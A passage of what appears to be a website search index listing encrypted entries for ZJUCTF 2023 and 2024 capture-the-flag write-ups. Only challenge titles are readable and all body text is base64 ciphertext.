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;^","title":"\ud83d\udd12 ZJUCTF 2023"},{"location":"ctf/writeups/zjuctf2023/#zjuctf-2023-writeup","text":"H9dBhx9y4NU7yvCkhWyytg==;+osBkBG94SKxsH/GdEEa0IXMhzYbhDoG32Hp31id+zejClV2kQP6pOnJ7eBpbSYu8crunvstwe2GfkerUs+uEegl/5fj6M+ktQyBV6jRxtKJ3PF8p7nkccIHjySdjnEUmAppk56Ci5rRaDwko+pUKppu6vX57ECKNrILoA90zNGvleSEJSiSJnZTlRc+6FlB7ABtQP41hSMPO9m6GpgBBYPIVGyG1krhHvEQG66hN5Afq5MjoVCWy8wU7WnbCB/tK0jkTtt/4vjtAvv+RdSGNLDtGvVBwbTRTIesWaC69RJascNWyya4bv5M5/KdKGbjtB6UfHL7mqFE5R/IpHGe6OsFQjRJNUyunfh0GQXTfV44g1bRVwNI6mRwI9t2DSepvR081APP7vQ7+X4U8YTTollTxKecUF3KUp5Z5RWwtu+KitzFo689H2eYQZ78LOgBKzZhFH3Aj9+vYdkNsb0Jvv/hAapMafzsHy+JtYuClKZKf0m5EFvZnmerPYrj5teX591k1GTpTcYWhjXS8wdLczJD9uLTuIdAgdyRSrTQHGWp2vgwTbChMzB2xaou1qQqwQvbOkjbbkxcSDVLPQLqw/VVdToAnuZeIDr4laVri+w1C3ZHPHInHn5dxa2nLDrOa2au0T9iNV9JbIXWkXALsSkuNPwNZppEJ3zqf8BkYiSFx842qA1dRYI1dr0/JtzR8FEmWMLm2ncGtzD2xnH2Sp4wcLuy06qqv1yFgb7il1jh7djSaSvqMD97hwza9ZkisQ5tyDPItOcreoQDb2BlAguhG72wQIBKfZYhu8puzPninvqrmdxBUb6VmC28rh403UJhcM0MA4OKLJ45+jqfMmtOSCQIMfSyCgWMQ1QOhTNiHkwXxWGWI6LdF9+SfV5li10p6MFkL0kCkIzOamYRzqux4dDmzATctUYDk/wyKmjMACAJeo3DXa1XQvI3ZD/bXdPNaQJGNfEz0b3kWsMi8AZwL8R3h8zvLZ6KvsIn92GTdDk9pzBhQB8PPSJcCdbslqTxPUKtqhPcYjRCoFFqKHOZmMPPEPrppluRS3f3ivhkpRfkVw2RjhRp3U8i8jYJE+eSiwvPzZuWYz/U+rTQquZskD4RfpTOQ99DKGiVv25qJf66XyQeVNcSCWi0jFoSQK5l3qcWYK0+ft72SGMh20Ef7nifTR3yAphBR+L+QCiSGU2Yx1awZvnE9FPpeh5zfcONBYXoVKb14Z5FY7vMgdUWvdAycIM4cisuzCzxLR254zUZ6xeref+ed07APxOK;^","title":"ZJUCTF 2023 Writeup"},{"location":"ctf/writeups/zjuctf2023/#_2","text":"6/7XXSfu/DNHYae8eAtzkQ==;Adll0NvNLFZhp1l5fP6uSlBq/zdYjs9vew/zOo0Eq7pZzxmRiiw7eW50VfJkDPEJbe10KW0HQMptWJ3joL0OuDjzKUe1bIa/XIHj/SA/Rt0ctSZPuH6rYd2pjWE2K5+bh3365gp/UQtB7BXbRR0FY6qSeSHN42pt0COiPElo6rk=;^","title":"\u666e\u901a\u7684\u9b54\u6cd5\u53f2"},{"location":"ctf/writeups/zjuctf2023/#23w40a_or_ctf","text":"liZpKiDCuBt4VaIIE5bNKw==;qwpY2W8sn46lrGlP5m8yiRykhCuV1uZ9cqv7620iLG2a2SFxB7RG5m4z63MPd+UbyRcXgh4UvlnU9tUPALW9630vrNe0/gFbzIFYsYlC6KQsBeSl0PgdfcyjA66yLqs9ZZRmCEMARtHSVimQ53dzI0aNuhyrchvPLVMYlzyjCaXklfZ0MfLTRfDluAZ0qsQgptICKq3VQh5wkYPMVtuv4ClgaTeUTm/itwnRUaLwsYKrgaVuA4QFD3tSoSIfSNlXY5XAEm5u8Vvag1jpme/WmnUAEthi5hUCIsaHXQQurRVdp7NX+mS5d/MqqYaLsqSdoc98cnbYDEDo8m72t1JDBEO/iwiVWb737npFWVIMoleUfIatlVquwtrpQb2jHOCBaQH7BTWizqLJ84Ou0TrVsYcmfMGfKFFyIAzQYD+Hrn4qo00opDmJ9zcxJPw+Dta4wGoT2rEi/z9cnBLIc5FhbRi7zdIro4PSkuR+YgnFP8QRvbPZCINKQEl5QfdQjyPVhM6Esj8ZJkHIHA+Baf43kA64mMEZH+mgzFZHPgfpGCA=;^","title":"23w40a_or_ctf"},{"location":"ctf/writeups/zjuctf2023/#ruru","text":"3DSTUagcjXJzMknexOANDw==;rCv9HPBJesTClPHtNvIc+ZcHlwYJxr/u/eoka2IuAFbyGOz7TFejhNO15t+yX0ibW8riPlaWJvbRm7cROZEGBLEf5I2FfkUuGAO2xZKAVbeUsxtyK4l8/xlLIZx8kTJ32ZRzuNKBH0gxA39surIvDA2aJoe3viDMnJ+1nkWtk/M5lEfHJvd7HBCG9m4LM5qh8S2OhhM0Ww5lFpRgHR45y26qUSxy3t7VoAgH5q9aMI7XxJMGOBoOGANqcGx3tyK8LMxwCfP1V9CwadiTPebdL5vCbXpu3+91xo9N5kxtcPzlccZTRDzrbyUwuWKTcLjNf7zrS2tfxlIZvU+zSEuAjYL/s8qySTI8sZ6tlwxNC/3Pno/+FPh/nU4mXkl3MWncZgjo0BMJpe744tUun9D1qLvdk8NU0R6kWXYVco7Q/gc=;^","title":"RURU"},{"location":"ctf/writeups/zjuctf2023/#genshin-impact-format","text":"uQCZm1HQfiFn1QftPcQ8Rw==;4q21MKM6jo/6yt7MBXj/YRq3mIP0rNppktB2Y3o6YcyrUsrEyiaU5UuvPdczQE9WaxoCIJbqXJqKwkKi+uDtkctH5hwwcGtjTrxDGbf5RGonXwRx6TuEha1B5y6D55u9PsHsJvTk/QdviYSaxvQnPqSI/9R/wuuZwGMzwfONOOc2gUIBii6KKXb2cOkmKqU+qfAhM+kFKiQcar1QJMa3Xw==;^","title":"Genshin Impact Format"},{"location":"ctf/writeups/zjuctf2023/#proof-of-work","text":"VDYPwcUoAw7MZAMe44Zv9g==;jExToE1HEaeU4lVYKbLYokBQy2U34UYkNYBgcVK99DQ=;^","title":"Proof-of-Work"},{"location":"ctf/writeups/zjuctf2023/#quine-relay","text":"Rv4oQg4mmCVqnBrZe4bgsw==;f4RH+uvjmzP/GkG72N3UdgLoI6pZVlt97Vi1ddQd9BHJpHJslyV3hL0eJAjpG8v3jXY1FIrNL7YF1RAGW/UpibXIt962to/Ibby4FvbWupxbYqX6qRAYajDLsoXx/7Us;^","title":"Quine Relay"},{"location":"ctf/writeups/zjuctf2023/#minesweeper-master","text":"LdjWNEgGoq0vbRbpcGv84A==;6ea59NqfTIjv5H+TaPy9KOTnjBLj4jtgACdPgZM19Vo=;^","title":"Minesweeper Master"},{"location":"ctf/writeups/zjuctf2023/#easy-reverse","text":"0PcCuKEOXls4g3KSDINhNg==;DlN/eWuqX7EOJq0AVMLrXLXdVU+EvU3442SxJTn0dhHcY9iBMHTu/e6ziKhOrV6oaD+2cJk2StXakoF4zkXlLOIF1lX99p5/IzSruIIdAPqfN82+Nqxma9GKdOChfzBQolCLkFM8v+m9EiYkAmUgXgjiLf4qVJdK70vT/Y739t0=;^","title":"easy reverse"},{"location":"ctf/writeups/zjuctf2023/#hash-predictor-1","text":"F/IGmz0SQWJsAlczLnIO7w==;HUuVhT+mAaQxTQ1OoJSol76ZJKDFItfEn5XE+meeRYNuwTaifxg3AjzAGwApRzyi2C+c8m/WDTlR5Cjp5Tjed+XTtoTDkU497kTjZqGbSfBD+/VeINXdaZe+OrhbRS+tzWptPp/GFjUX70TMeUPWdgDsd2M5buK3cwBztzmwDSVy0wEiTxOcRgBITsMABMS1ZPSsuy/wxXDY33Xu6PNsDJwGrG9uWijfHtbrVflSxAvqQuEyNxx/m+/78BsB45Ka;^","title":"hash predictor 1"},{"location":"ctf/writeups/zjuctf2023/#hash-predictor-2","text":"iGy8Pyb+X3RbbKG6sxe9+w==;bozgkEfBwgus4RKCS4wBcY2HG4u6xjliOd/gR/vrFjzy+bc6opRaoBxcUUgBDHLmaFHAI1tfF/cMOT19Bqo+GMz5QQJ9kBDSLq/QxN+IRfU3jAlH0LXkpuGrWse3DFMr;^","title":"hash predictor 2"},{"location":"ctf/writeups/zjuctf2023/#welcome","text":"Uoy0BepFuSwnaZC1izSvqQ==;RWcSsloMWNniSK3KVLbDwcfH1/yI6kqm3eweKgr8ry5O/4aSq0MPZs8kGzxat6YWFtLSD2p01Cit1QzBG3YejQ==;^","title":"welcome"},{"location":"ctf/writeups/zjuctf2023/#baby-sql","text":"eod3r9UfPceMSGdO3dji3A==;hPoik5ktwIyeANqqZ8V4SZ0b9lAvNOq0Fjb5xBjlNhhoD8Qahp5AqY+VkZA5Unv+wxgooSIi8BpJw4WWnoOTnA==;^","title":"baby sql"},{"location":"ctf/writeups/zjuctf2023/#easy-sql","text":"WFTfCnR6Cu0ewZ4ctOvLYw==;opf2Rl+dg8usKzmK+sCVqs4x2JRbYdE6H2r5Z1QO68pjsbn05DhjOwTH1RpsC2ZOde6dDkjN0BfCY/iwPnSP84Fj8pMyazR2dOVn7u6bJUAWro9F3avqu1p4EpVwgVmk;^","title":"easy sql"},{"location":"ctf/writeups/zjuctf2023/#babyphp","text":"cqJT9nlP+ZMemyr3KXew6g==;mTQWdSKZ/kD1BSYaqkF7dlGiWlBgtpJLcJ5CqSpP9KQ=;^","title":"babyphp"},{"location":"ctf/writeups/zjuctf2023/#easy-calc","text":"7PcyJ/88Z8IZaiOCa3wDYg==;Y35x7KduZYJ4Rer81JfgN9uP9o00NHkW3tzGqoAMWEe2/t5R20pvrv/Ry92udpEbbZzQmbaUusQzgEEitUQdZQCZSl4G1A1gruipFNajmUOJLoZ+vOM4XF6nq/Fo/lLA;^","title":"easy calc"},{"location":"ctf/writeups/zjuctf2023/#babyfor-realjs","text":"NlhuDiebKSePPdsRJoGY6g==;RuqsQsLSnYH1DSU9e/2JL5yC3jjB9q7sAacr/bFpFZY=;^","title":"Baby\uff08for real\uff09js"},{"location":"ctf/writeups/zjuctf2023/#rev-signin","text":"4H82ls50QKKm4wupz9zPnw==;icbdiadlepzVrC2M82C8WG3HqHMSrNXHlFSYJv/oqbwuDhcDmQmkaVwbm1umYWik3bE8kHwoCtpuUhgcdTrqGZiL5Bk5HDg3v9G7z/C3prrpbjvfEsv80ojgV0TBF3GG;^","title":"rev signin"},{"location":"ctf/writeups/zjuctf2023/#zju-dorm","text":"aGQ+QkuNmGL+wsZToOMANQ==;NeZf5V5R8qjVFOCquZLm6OraRkbvcgRnQsruneSBr3ggZKJKeQ0aYrJC+VWPpPI4gF0xvoKwz+vQa6cHMJJdEFm+kYa3ayt3pcw5M/b1o240HXP2kALKjdEVqMUl66gZ;^","title":"ZJU dorm"},{"location":"ctf/writeups/zjuctf2023/#if-else","text":"XDZMiRg/D/fhoCt1uxkB4Q==;zMhtsr504+oKcpRVRNZKopI5hokRkSJfaXY4iztjpeQYJx22R6QnAotPU0yGCoifH0oNQWfN6/MxxwRySxnqauL14zC9R1yN7VtJ5rmedaTQi4vY+m30axKBHpOmVGULOa5mu0i5B3bP5Ii/P6q/zXMtSB2McdWEWHsC3XeC9nQ=;^","title":"IF ELSE"},{"location":"ctf/writeups/zjuctf2023/#500mazes","text":"6rXhJjdWgDhGx8GOAxkcqg==;KumRkKh94xRmTYMs1RX5sWlPYFz8KY/1wFHapg+FXEqC0gTYhOrfRAm/9/NZR6eV9iHbfD+n3Qp2u3XHbIcEILqhzcAivLDOLmC4meR4orpAl26JI4GTYw5KLFtAepBMIc3aGhmw5jarmtU61rNXwUg2vaup0j936R2FQRmiemz30NvcQsyYWzErXNternqyA/GZfs7JazhLKl5tpWKD824hml8G8N6bxUlzSPNuDd268An5yWmiVZ0Tgc4jr7Kq;^","title":"500mazes"},{"location":"ctf/writeups/zjuctf2023/#_3","text":"r0Zckw7qf9h0luUEPVTKlA==;dIRfo1LmieG6cskI5HLMC0row5vJnjKJI9AZZ0y3Czk/gd+n6q1vFSYAMcOhWPb94MKdGrX2nl/5Kj/jq2lEdVLBeCWKRzM2/+sEAXuGc+WgBXnTrPNL4gbHwFcUlT0XcyRj5bC7ho6zemmjqGNFQ/i9XQSuKHwrEh6DeBGPIH24BdyV7HUSs+v0PoQFHMLPmcH7TDkTdO2KyG9Kar98lw==;^","title":"\u26a1 \u9065 \u9065 \u9886 \u5148 \u26a1"},{"location":"ctf/writeups/zjuctf2024/","text":"vdEX0A1lS3sr4k7nE8O8Hw==;;^","title":"\ud83d\udd12 ZJUCTF 2024"},{"location":"ctf/writeups/zjuctf2024/#zjuctf-2024-writeup","text":"Y9e3j4fBio7sk8tn1Og6kw==;Oe6wStwdkbJgR4i7NZ6jbknr0JMG0a/KR3Z0Sd95zNGzAAFQ4HcCkJyA09//W5og+yfXFaEyr7vt9Rbtv1YECp0iwdx4kCCOnBEb2nxzTXs3IA07rGLHiZx94ZnoJCu0flsuuA/VS1FCCS9J7Tn5N2fzOYtX7RyiHTQCAGSd361vYiMW1xwimCIWXt4vritdKZgZJCx6BZiER9JpL0lctVH1dNgbRd2Saqiop8pRvVGQfdvSFAW0aYH4TAYnlyR22OyL7OialmCnUbflBngm1mfLzZLSECzKotZLReYzbZNTpo3lzEsIsevPie94qkRmxygg/LKQglH8tWskCef2XEY6qN/rWjB3ycTWYQtulcOZnL+e5bugYdyIbQGebHNTUONd7C267tk9AcH4aYrAMo/M7cn+/Z0Q3yvyK7rDIlM3U2UfR8VcMxv/uRR4PbEuLcx2DID6b+vStakp/Hjozm6t1wP/n1qXATwOvLAl+6xMDCipE3RVzjwpQluQws2K1bkmJ0rtJR3j+XvLvXHZO96jGpN9mS/9OhfpsMG08LbDw6Vo/qrq+XW8fnCmttfjitnSrtzbNdI8mboIhzag0w==;^","title":"ZJUCTF 2024 Writeup"},{"location":"ctf/writeups/zjuctf2024/#misc","text":"SmX7LV86+hQ0Nj9Z4s5Ghg==;X2Jr5bwwbM981VVkto8Y93i/cNhh4CQq8aMllp+Iz5s=;^","title":"Misc"},{"location":"ctf/writeups/zjuctf2024/#a","text":"SLO+0Uwa1sWcO9ixO723HQ==;tdh1etHmrfwCJ3+wP7fCMzOvnUrv1Mfnho94Kij2wBwrNiCTwjMcSHJ9cO0akjfwvfW24OqRsMnpAJ9j5HDrH41fIf/rqY7ljBz/ZIIFmx1TPoA/LaIE3Zn6kMtMHH1mAEc1foLDM/BHYHAUdcT+Ut3l4VEdqa+2Y8VJYNmajx2NUTCwWhf0b+krdCbH4/1/SPVmXPoluVm3nte2pVquZ6j3kurFcs+fcLvddWatsQDk8baC/E79nuq08oq4QYo6uImU/20AHyITNlfQ62vnTZukMSE+BLdh8ZlQAYrOO4Iqrqu/+MKZvAiW9YPkI5M2Pk+v7W7i1Q2wR7F/LYYKDFu+t67BBid0DFvz2+m+MUlYyhtYBodRlu70jvbW4MANFLd2toSkd6lppi8Mey79/d2m7EBuAUB5mPEvHmdwj0tvDv53lzE0w8fqKJDyr7pvFopOvsXnyINjVi/QqqEB/WHSrpAGS27Zr9qotCLVHbCUhUcHTBd8JjvwTLrA4tzwRwgPYj+5YH8rxlg4uGqdnzp6sooqBnLSG5pMa6fdz7h+G3+00kEOehefiDrDJ37sjt974phTrc2jmLSTic+bZrh1Ot+krWH1JtnJytM9uO+IoetzNUGTZKFSm2/nMech0QNQlPi0/J8jQdN1l0umyDsb6KyhQMtkoXUjxTvp+I6AaU9nCBNh8lVjUymWfrE4gGTAlpTeomVdoQqbFwUMXZP3FGPIirNOlkHEO/LnDptqCnk5ZKf0fDjkVP6GGvFBP7BCH789xtKpxJ5QyWBsdxGWPWMp3rNV5jO3BrE+yMw4FX0BL+hiL/exiN0ziOyZgmmEqtqdKUn7BAwM4TgFtmfDv0p+yo9f4XcZ48CZSscUizlGpOGqVtMhCszV8fxXjJrrEglAhJL4rJ9qCZc6H2/SLgF/OfyT83VYsdQk/KYUw9Xj0jRKQaI60FDV/VTHQqqF+ugBYQUERdDkdXGjlzU1qyiP6gw05APb5l8toUdqKziYf5V4Y+bTvkVf9KWfZm5Jc5bGWWJl82HmcYPcLZU/pQ7/lEh5LF3PDe5LW6idg5eNi8C4cgI7hTpmDmjtyhPSj7yAQsMmceHlVzoSsA==;^","title":"\u5c0fA\u53e3\u7b97"},{"location":"ctf/writeups/zjuctf2024/#silence","text":"eEIeLUlgH43nIlt6yezgOA==;vy/0SxWEywiLP0rgwv8zSOSgI8LJiNjBs9P7RS5C/YWWeLBiG8ZJGWFBY+OR4DLpk0TpNJw4X5xstXQWxkeyVX8o3KjJfKOy22POdLMkgzbXzh9ZzZ+qivEWspj+T6LZHq2n3x30pt/xi4H+83g9WN/8lO0FA9iPyrmeo8OSNesr0dsPRH+QTTeBHIFCV7eD2hWk74gfJlD64KXA0L0XB3F0HohwKlDlYmZTdNtSmRpZO+DeQA166leRXT9bfoJ/;^","title":"Silence"},{"location":"ctf/writeups/zjuctf2024/#master-of-c","text":"iD0XGzuf8yDlmivaS1o1gg==;U6x+j7m4O/OhPUDexTtmJ5gutey2P76/a0tCmY86TtU4DGmHEgbdEfIY+B4WZPqoPbZuGAyan0ErMyqwYfxRUXVN8NkJYdWc9n22s0leKMd8RyPqCCxzQ7l+CUlUXy+aWRJk1Qx+mxyBnajY02H2rZAz9r+0yqyq0tjZHcJH9AeCRHyIiuThEQQAnBP4BHzUOnGXA4IkDA4+tgf/U+wogFinmNbHk80R646RNeCmLtewNT1pLJFSl4wFDcLpecTwyOWxpkv19p2qEEuZIN3hv7jb+07bD3a3mtGIxRBTuTPlm3E+DKkI0lbSl1YEVLRbcguaHiNIPZUX0DZ0/SOR3FDEWEFmYYKGQhykUYIrsbz5b/h0F9fq/OjrS9wXkw6dQsVJWRSq6jtA0Z/xzomLMcM2nwP/1KWYdGfpDXd7bZ8=;^","title":"Master of C++"},{"location":"ctf/writeups/zjuctf2024/#cba","text":"7ModxKTsvqzcQo4FcAeRGg==;JGUOkKT3tOOP/kkofiBNUTwUF7fINbKtqma8IEakqpxBznlXUtA7wSpg6tDckzLBXPZrjv9fONP25LAHRNGMy6opgFxxZKvKJL+i8x5G/TrGIrsBpxP3nX+zjHlUnoeBKupTzp6AfDCDltOAXrXql8DSOon2GnkKZfQ+g3NkBtbYgdKUN1wF2Y2RzuyJwfChY7quRZDfZ6cREzmbNHgVfz+g9Zen5N+vxndnhkGBDxy0/UxYYzvHDtNHozO+GQR9kqHkhITOoaCjxuxlowClHrNTe0V031XQVQ2QKP3yZtWs6oCxOMB4nS2qJcbXCKZCUCk2WgmiZ/pE0YUq0/K63w==;^","title":"CBA"},{"location":"ctf/writeups/zjuctf2024/#_1","text":"ZW1sz1ivVn1rHnNz+PmWjw==;8Mu3vub6UcMPt7R3yNsFILJ5EOkFnFtyroMaMI751wpJSqUQ2aHHJGsl2495PNITGDaV3vJVwbYU99QujFtS6S6qsiwmegSTNj2YGonNQtn9hrv5DKgVFcg5xdyprh13Sj2/dBfYItxMGzLpdXO8OS8TsAgaDBsJWR+hymdb7GpbEmHPUKiKaZRBbsnGM5IkwnK8RPiDiTgRKCTlsHtc84x3dMlEwNsNKqT3s2mLvEPk8/Er1u6gfxIiZcrB5wWD32xVM5VBXIGr1vhFreGZiLa5Y517zI0eUCECHAZrBIas+PmgOkGI5III4ZHJ3PRBTVxEfRbPCh4YBez0tsdCKpB2aPeKbXXLU9QyCs7S1fh6ITY8JD1bYxx3ZTwdZSV0Ny/B6iuAuDczuZtqKpgME45t0B+XnYgMo9u+KhKlDasH2JBFMDZM0hJy9fV+owDBe24+qeotV6Hf2A69NHG4O74/h7db3fOoHG2rJevtuiGvQBUNrsdISYXHhOBAaacuMOEE7G3lZX5M//GZwdJpctE8YCFKovw3uFIe/xGFofCnD1zjmyKjFA9gccwLtaLmXvihaGOtBWDWXc8gel3SFw==;^","title":"\u9505\u91cc\u635e\u9762"},{"location":"ctf/writeups/zjuctf2024/#bytes","text":"2EH120ZLoZ0GNfv94q429A==;8J9hwlYFwvbO3WBFrqCS8vaHZiRmQhUDpaP+zxfF7R8OVDuW1ROU+ku1sC410LszVD0ck0bN/zCRys9YslEkKEix1A5c+yeu8C70w1Z0dPGZHNoFx/zr939/eAhAdLJSHQpcEaVfwwJjij5EWtDEc2gMkjXvNIAmoufR21MsUuz093wfjy1AVZpQQOKHpFqvPzFejIMmcQXfZu6sglxkFHSXeM5tQ9qr/bB9vKsMgnguXt1u8S1QoQPT/LDTPpDBY4/yO+0GWbIJNf1zhyolxxlZEvfYg4xtdOV1C7vOsSwfM/vFR8g4LhaHDntl4Gd8qqp9hfgQvBsVP/f8viJ/QQ==;^","title":"Bytes?"},{"location":"ctf/writeups/zjuctf2024/#minecretf","text":"MUYqLVhNLwioZd0pbTNJeg==;cqdEQDGam/7xFKDMDGF8ibFknX+qwX3FBKDkGvWaOhl+HoG4DONNCAgrBLAtt057yhzGtrPHUi37qrHWuLRtKpo3ThdRKAA/f+j8XfD4H/b5dFMGwABmhQ4hIptcJYojZwdwwMXzHGBYapvPksuNUmLwb267UU/wq087z/pPstdiwst81cWE6L0g0WA5NDqhZU8QK1d7R1mLwkEiHnxVadmr2U6ik5meFwS43pWbw6TrC9Lh8wlv93DN7dSAfkerspGM8f0XRhbYukdUL2oevM31waFbrG+r9ZcImdzoFB+Xn/Zt/b/FUuJGfFem8FTHVFUCp9HGGc3AQeptROJp/9tcgxyKNFzgXydGYPobzoDc4x7VyVxxjUOdJRsf5ClDA+SemVx7/PhPDEQBcuKNn3pZLGwM1oCNtkfGx9kywkcmKc5Voi/BPIH43zQSFMz7Lv9JoebDsnAygeZnRJ62dnopPxf4kkdcqB3u+3DUgJHWwE8Nb+VB2XG+QF26MsWrxa+piQGVDzpdPwhl+q6um+Pr3K5dpML+qXh9fQP5rVQxRb1aREYmvRAaFlpkeVkPrwWPqeNDA9FAeVx5JPmTiKtDEXOhA4HILhfhsPKrWCFif7g/wDJ/VgcpFWPG3QpPn1E8F1pXuWICue1w5SRC/0JjJAm2AJH4NTsR588XAHnjWOyIuItYRbbVquHKucroUV7QxovttjFhUTOknJT20F1okNMWaufGCfEwFD7GuFEOHhLS54ZjMxNIo/gpT+4HTDJvmhHGV23FpvFbAAwPaBrSQaNNOCz3F844n5djkJ/yGa/Vx9qiv1pjdijhH8k+h2mAq+RpQ/EurSKgZM5ONRyiwWoq8+xWn7NmP6swRnEObxp1qw3SmEqAXAzYUPn75eWmq6PjDrnWfQMoZAg3x+ifmZzzl9iFtdxg5z2iAnM=;^","title":"Minec(re)tf"},{"location":"ctf/writeups/zjuctf2024/#reverse","text":"BVO5bH4HnhL2sC8q6/tFxw==;6buzKVwCD4yNwF3y1ed78wQYAKjkEwGaI9zyGKDRSxw=;^","title":"Reverse"},{"location":"ctf/writeups/zjuctf2024/#rev-beginner-1-2-3","text":"21v5UhcNQNGz2BPHnsA16g==;llvI2SMQxl6rjhMf+RQrJ0sPIgQxs5zupUODqqKDHGLqAymaexb3jwz5rTNR7Zo0QW69ZWya/jTJJcxbwNMi3diENXLEgKrpqQrFlaFjetZu6p0YcKIkWH6O147NKFDm;^","title":"rev 